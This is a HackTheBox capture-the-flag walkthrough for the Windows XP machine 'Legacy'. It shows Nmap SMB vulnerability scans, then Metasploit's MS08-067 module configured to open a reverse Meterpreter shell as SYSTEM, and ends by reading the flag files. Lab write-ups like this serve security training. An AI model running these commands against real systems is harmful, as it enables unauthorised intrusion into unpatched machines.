---
layout: post
title: "HackTheBox - Legacy Walkthrough"
date: 2026-06-07
category: HackTheBox
difficulty: Easy
tags: [smb, windows, ms08-067, ms17-010, htb, oscp-style]
excerpt: "Walkthrough of Legacy on HackTheBox. A classic Windows XP machine vulnerable to MS08-067 and MS17-010 (EternalBlue)."
thumbnail: shield
---

**Legacy** is an extremely simple machine on HackTheBox that runs Windows XP. It has two well-known vulnerabilities: MS08-067 and MS17-010.

---

## 1. Initial Reconnaissance

Let's start by scanning the target machine using Nmap.

```bash
nmap -sC -sV -p139,445 -Pn 10.10.10.4
```

The scan reveals two SMB ports open:
- `139/tcp` - netbios-ssn
- `445/tcp` - microsoft-ds (Windows XP)

---

## 2. Vulnerability Assessment

We can scan for SMB vulnerabilities using Nmap's vulnerability scanning scripts:

```bash
nmap --script smb-vuln-ms08-067,smb-vuln-ms17-010 -p445 -Pn 10.10.10.4
```

The output shows that the machine is vulnerable to:
1. **MS08-067** (Windows Server Service vulnerability)
2. **MS17-010** (EternalBlue SMB Remote Code Execution)

---

## 3. Exploitation (MS08-067)

We can exploit MS08-067 using Metasploit.

1. Start Metasploit:
   ```bash
   msfconsole
   ```
2. Search for the exploit:
   ```bash
   use exploit/windows/smb/ms08_067_netapi
   ```
3. Set the remote host (RHOST) and local host (LHOST):
   ```bash
   set RHOSTS 10.10.10.4
   set LHOST 10.10.14.2
   ```
4. Run the exploit:
   ```bash
   exploit
   ```

A Meterpreter session is opened as `NT AUTHORITY\SYSTEM`.

---

## 4. Retrieving Flags

With SYSTEM level access, we can now retrieve the user and root flags.

```cmd
C:\> type "C:\Documents and Settings\john\Desktop\user.txt"
C:\> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

Both flags are successfully captured!
